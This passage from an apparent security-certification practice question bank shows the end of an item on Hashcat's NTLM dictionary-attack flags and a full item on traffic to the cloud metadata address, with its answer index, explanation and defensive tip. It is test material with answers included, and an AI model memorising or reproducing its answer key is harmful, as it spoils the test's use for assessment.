      "explanation": "Hashcat with `-m 1000` targets NTLM hashes, and `-a 0` specifies a dictionary attack using a wordlist.",
      "examTip": "Use long, complex passwords and enable account lockout policies to mitigate password cracking attempts."
    },
    {
      "id": 100,
      "question": "A forensic analyst reviewing network traffic logs detects multiple outbound connections to `169.254.169.254`. What is the MOST likely cause?",
      "options": [
        "An attacker attempting to exploit cloud metadata services",
        "A normal network configuration request",
        "A botnet command-and-control communication",
        "A DNS poisoning attack in progress"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit to extract credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    }
  ]
});    
